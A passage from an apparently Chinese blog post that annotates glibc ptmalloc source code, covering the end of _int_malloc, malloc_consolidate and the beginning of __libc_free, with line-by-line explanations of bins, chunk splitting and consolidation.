&amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">         set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">         set_foot(remainder, remainder_size);</span><br><span class="line">       &#125;</span><br><span class="line">         </span><br><span class="line">       <span class="comment">//至此已经从 large bin 中使用最佳匹配法找到了合适的 chunk，调用 chunk2mem() 获得 chunk 中可用的内存指针，返回给应用层。</span></span><br><span class="line">       check_malloced_chunk(av, victim, nb);</span><br><span class="line">       <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">       alloc_perturb(p, bytes);</span><br><span class="line">       <span class="keyword">return</span> p;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Search for a chunk by scanning bins, starting with next largest</span></span><br><span class="line"><span class="comment">      bin. This search is strictly by best-fit; i.e., the smallest</span></span><br><span class="line"><span class="comment">      (with ties going to approximately the least recently used) chunk</span></span><br><span class="line"><span class="comment">      that fits is selected.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The bitmap avoids needing to check that most blocks are nonempty.</span></span><br><span class="line"><span class="comment">      The particular case of skipping all bins during warm-up phases</span></span><br><span class="line"><span class="comment">      when no chunks have been returned yet is faster than it might look.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//获取下一个相邻 bin 的空闲 chunk 链表，并获取该 bin 对于 binmap 中的 bit 位的值。Binmap 中的标识了相应的 bin 中是否有空闲 chunk 存在。Binmap 按 block 管理，每个 block 为一个int，共 32 个 bit，可以表示 32 个 bin 中是否有空闲 chunk 存在。使用 binmap 可以加快查找 bin 是否包含空闲 chunk。这里只查询比所需 chunk 大的 bin 中是否有空闲 chunk 可用。</span></span><br><span class="line">   ++idx;</span><br><span class="line">   bin = bin_at(av, idx);</span><br><span class="line">   block = idx2block(idx);</span><br><span class="line">   <span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">   bit = idx2bit(idx);</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历 binmap 的每一个 block，直到找到一个不为 0 的 block 或者遍历完所有的 block。退出循环遍历后，设置 bin 指向 block 的第一个 bit 对应的 bin，并将 bit 置为 1，表示该 block 中 bit 1 对应的 bin，就是能够取 chunk 的 bin 链，这个 bin 中如果有空闲 chunk，它的 chunk 的大小一定满足要求。</span></span><br><span class="line">   <span class="keyword">for</span> (;;)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">     <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="keyword">do</span></span><br><span class="line">       &#123;</span><br><span class="line">         <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">           <span class="keyword">goto</span> use_top;</span><br><span class="line">       &#125; <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">       bin = bin_at(av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">       bit = <span class="number">1</span>;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">//在一个 block 遍历对应的 bin，直到找到一个 bit 不为 0 退出遍历，则该 bit 对于的 bin 中有空闲 chunk 存在。</span></span><br><span class="line">     <span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line">     <span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)</span><br><span class="line">     &#123;</span><br><span class="line">       bin = next_bin(bin);</span><br><span class="line">       bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">       assert(bit != <span class="number">0</span>);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">//将 bin 链表中的最后一个 chunk 赋值为 victim。</span></span><br><span class="line">     <span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">     victim = last(bin);</span><br><span class="line"></span><br><span class="line">     <span class="comment">//如果 victim 与 bin 链表头指针相同，表示该 bin 中没有空闲 chunk，binmap 中的相应位设置不准确，将 binmap 的相应 bit 位清零，获取当前 bin 下一个 bin，将 bit 移到下一个 bit 位，即乘以 2。</span></span><br><span class="line">     <span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line">     <span class="keyword">if</span> (victim == bin)</span><br><span class="line">     &#123;</span><br><span class="line">       av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">       bin = next_bin(bin);</span><br><span class="line">       bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     </span><br><span class="line">     <span class="comment">//6.当前 bin 中的最后一个 chunk 满足要求，获取该 chunk 的大小，计算切分出所需 chunk 后剩余部分的大小，然后将 victim 从 bin 的链表中取出。接下来的操作跟“5”的基本差不多，有剩剩余部分会进 unsorted。</span></span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">     &#123;</span><br><span class="line">       size = chunksize(victim);</span><br><span class="line"></span><br><span class="line">       <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">       assert((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>)(nb));</span><br><span class="line"></span><br><span class="line">       remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">       <span class="comment">/* unlink */</span></span><br><span class="line">       unlink(av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">       <span class="comment">/* Exhaust */</span></span><br><span class="line">       <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">       &#123;</span><br><span class="line">         set_inuse_bit_at_offset(victim, size);</span><br><span class="line">         <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">           victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">/* Split */</span></span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">       &#123;</span><br><span class="line">         remainder = chunk_at_offset(victim, nb);</span><br><span class="line"></span><br><span class="line">         <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">            have to perform a complete insert here.  */</span></span><br><span class="line">         bck = unsorted_chunks(av);</span><br><span class="line">         fwd = bck-&gt;fd;</span><br><span class="line">         <span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))</span><br><span class="line">         &#123;</span><br><span class="line">           errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;</span><br><span class="line">           <span class="keyword">goto</span> errout;</span><br><span class="line">         &#125;</span><br><span class="line">         remainder-&gt;bk = bck;</span><br><span class="line">         remainder-&gt;fd = fwd;</span><br><span class="line">         bck-&gt;fd = remainder;</span><br><span class="line">         fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">         <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">         <span class="keyword">if</span> (in_smallbin_range(nb))</span><br><span class="line">           av-&gt;last_remainder = remainder;</span><br><span class="line">         <span class="keyword">if</span> (!in_smallbin_range(remainder_size))</span><br><span class="line">         &#123;</span><br><span class="line">           remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">           remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         set_head(victim, nb | PREV_INUSE |</span><br><span class="line">                              (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">         set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">         set_foot(remainder, remainder_size);</span><br><span class="line">       &#125;</span><br><span class="line">       check_malloced_chunk(av, victim, nb);</span><br><span class="line">       <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">       alloc_perturb(p, bytes);</span><br><span class="line">       <span class="keyword">return</span> p;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">use_top:</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">     (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">     search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">     less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">     be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">     limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">     MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">     exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">     reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">     to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  victim = av-&gt;top;</span><br><span class="line">  size = chunksize(victim);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>)(nb + MINSIZE))</span><br><span class="line">  &#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder = chunk_at_offset(victim, nb);</span><br><span class="line">    av-&gt;top = remainder;</span><br><span class="line">    set_head(victim, nb | PREV_INUSE |</span><br><span class="line">                         (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">     here for all block sizes.  */</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">  &#123;</span><br><span class="line">    malloc_consolidate(av);</span><br><span class="line">    <span class="comment">/* restore original bin index */</span></span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range(nb))</span><br><span class="line">      idx = smallbin_index(nb);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      idx = largebin_index(nb);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">void</span> *p = sysmalloc(nb, av);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">      alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h4 id="malloc_consolidate-1">malloc_consolidate</h4>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">malloc_consolidate</span><span class="params">(mstate av)</span></span><br><span class="line">&#123;</span><br><span class="line">  mfastbinptr *fb;          <span class="comment">/* current fastbin being consolidated */</span></span><br><span class="line">  mfastbinptr *maxfb;       <span class="comment">/* last fastbin (for loop control) */</span></span><br><span class="line">  mchunkptr p;              <span class="comment">/* current chunk being consolidated */</span></span><br><span class="line">  mchunkptr nextp;          <span class="comment">/* next chunk to consolidate */</span></span><br><span class="line">  mchunkptr unsorted_bin;   <span class="comment">/* bin header */</span></span><br><span class="line">  mchunkptr first_unsorted; <span class="comment">/* chunk to link to */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* These have same use as in free() */</span></span><br><span class="line">  mchunkptr nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T size;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="type">int</span> nextinuse;</span><br><span class="line">  mchunkptr bck;</span><br><span class="line">  mchunkptr fwd;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If max_fast is 0, we know that av hasn&#x27;t</span></span><br><span class="line"><span class="comment">    yet been initialized, in which case do so below</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//如果全局变量 global_max_fast 不为零，表示 ptmalloc 已经初始化，然后清除分配区 flag 中 fast bin 的标志位，该标志位表示分配区的 fast bins 中包含空闲 chunk，表示将要把里面的所有 chunk 都清空。</span></span><br><span class="line">  <span class="keyword">if</span> (get_max_fast() != <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    clear_fastchunks(av);</span><br><span class="line"></span><br><span class="line">    unsorted_bin = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Remove each chunk from fast bin and consolidate it, placing it</span></span><br><span class="line"><span class="comment">      then in unsorted bin. Among other reasons for doing this,</span></span><br><span class="line"><span class="comment">      placing in unsorted bin avoids needing to calculate actual bins</span></span><br><span class="line"><span class="comment">      until malloc is sure that chunks aren&#x27;t immediately going to be</span></span><br><span class="line"><span class="comment">      reused anyway.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//将分配区最大的 fast bin 链指针赋值给 maxfb，第一条 fast bin 链指针赋值给 fb，然后遍历 fast bins 的每条链。</span></span><br><span class="line">    maxfb = &amp;fastbin(av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">    fb = &amp;fastbin(av, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">//获取当前 bin 链的头指针赋值给 p，如果 p 不为 0，则说明当前 bin 链中存在 chunk，所有将当前 fast bin 链表的头指针赋值为 0，即删除了该 fast bin 中的空闲 chunk 链表，然后对这条链中的 chunk 进行遍历。</span></span><br><span class="line">      p = atomic_exchange_acq(fb, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          check_inuse_chunk(av, p);</span><br><span class="line">          nextp = p-&gt;fd;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">          size = p-&gt;size &amp; ~(PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line">          nextchunk = chunk_at_offset(p, size);</span><br><span class="line">          nextsize = chunksize(nextchunk);</span><br><span class="line"></span><br><span class="line">          <span class="comment">//检查当前 chunk 的前一个 chunk 是否空闲，先合并，没有直接被链入 unsorted，因为还没检查物理相邻的下一个 chunk 是否空闲。</span></span><br><span class="line">          <span class="comment">//如果当前 chunk 的前一个 chunk 空闲，则将当前 chunk 与前一个 chunk 合并成一个空闲 chunk，由于前一个 chunk 空闲，则当前 chunk 的 prev_size 保存了前一个 chunk 的大小，计算出合并后的 chunk 大小，并获取前一个 chunk 的指针，将前一个 chunk 从空闲链表中删除。</span></span><br><span class="line">          <span class="keyword">if</span> (!prev_inuse(p))</span><br><span class="line">          &#123;</span><br><span class="line">            prevsize = p-&gt;prev_size;</span><br><span class="line">            size += prevsize;</span><br><span class="line">            p = chunk_at_offset(p, -((<span class="type">long</span>)prevsize));</span><br><span class="line">            unlink(av, p, bck, fwd);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">//如果与当前 chunk 相邻的下一个 chunk 不是分配区的 top chunk，查看与当前 chunk 相邻的下一个 chunk 是否处于 inuse 状态。</span></span><br><span class="line">          <span class="keyword">if</span> (nextchunk != av-&gt;top)</span><br><span class="line">          &#123;</span><br><span class="line">            nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//如果与当前 chunk 相邻的下一个 chunk 不处于 inuse 状态，，将相邻的下一个空闲 chunk 从空闲链表中删除，并计算当前 chunk 与下一个 chunk 合并后的 chunk 大小。</span></span><br><span class="line">            <span class="keyword">if</span> (!nextinuse)</span><br><span class="line">            &#123;</span><br><span class="line">              size += nextsize;</span><br><span class="line">              unlink(av, nextchunk, bck, fwd);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//如果与当前 chunk 相邻的下一个 chunk 处于 inuse 状态，清除当前 chunk 的 inuse 状态。</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">              clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//将合并后的 chunk 加入 unsorted bin 的双向循环链表中。</span></span><br><span class="line">            first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">            unsorted_bin-&gt;fd = p;</span><br><span class="line">            first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//如果合并后的 chunk 属于 large bin，将 chunk 的 fd_nextsize 和 bk_nextsize 设置为 NULL，因为在 unsorted bin 中这两个字段无用。</span></span><br><span class="line">            <span class="comment">//这里注意一下，特意清了数据。</span></span><br><span class="line">            <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">            &#123;</span><br><span class="line">              p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">              p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//设置合并后的空闲 chunk 大小，并标识前一个 chunk 处于 inuse 状态，因为必须保证不能有两个相邻的 chunk 都处于空闲状态。然后将合并后的 chunk 加入 unsorted bin 的双向循环链表中。最后设置合并后的空闲 chunk 的 foot 为自身的 size，chunk 空闲时必须设置 foot，该 foot 处于下一个 chunk 的 prev_size 中，只有 chunk 空闲是 foot 才是有效的。</span></span><br><span class="line">            set_head(p, size | PREV_INUSE);</span><br><span class="line">            p-&gt;bk = unsorted_bin;</span><br><span class="line">            p-&gt;fd = first_unsorted;</span><br><span class="line">            set_foot(p, size);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">//如果当前 chunk 的下一个 chunk 为 top chunk，则将当前 chunk 合并入 top chunk，修改 top chunk 的大小。</span></span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            size += nextsize;</span><br><span class="line">            set_head(p, size | PREV_INUSE);</span><br><span class="line">            av-&gt;top = p;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//直到遍历完当前 bin 链中的所有空闲 chunk。</span></span><br><span class="line">        &#125; <span class="keyword">while</span> ((p = nextp) != <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="comment">//直到遍历完 fast bins 的每一条 bin 链。</span></span><br><span class="line">    &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//如果 ptmalloc 没有初始化，初始化 ptmalloc。</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    malloc_init_state(av);</span><br><span class="line">    check_malloc_state(av);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h4 id="libc_free">__libc_free</h4>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">    <span class="type">void</span> __libc_free(<span class="type">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p; <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//如果存在 free 的 hook 函数，执行该 hook 函数返回，free 的 hook 函数主要用于创建新线程使用或使用用户提供的 free 函数。</span></span><br><span class="line">  <span class="type">void</span> (*hook)(<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *) = atomic_forced_read(__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect(hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    (*hook)(mem, RETURN_ADDRESS(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>) <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//根据要释放的内存空间指针获取 chunk 指针。</span></span><br><span class="line">  p = mem2chunk(mem);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//如果当前 free 的 chunk 是通过 mmap() 分配的，调用 munmap_chunk() 函数 unmap 本 chunk。munmap_chunk() 函数调用 munmap() 函数释放 mmap() 分配的内存块。同时查看是否开启了 mmap 分配阈值动态调整机制，默认是开启的，如果当前 free 的 chunk 的大小大于设置的 mmap 分配阈值，小于 mmap 分配阈值的最大值，将当前 chunk 的大小赋值给 mmap 分配阈值，并修改 mmap 收缩阈值为 mmap 分配阈值的 2 倍。默认情况下 mmap 分配阈值与 mmap 收缩阈值相等，都为 128KB。程序返回。</span></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped(p)) <span class="comment">/* release mmapped 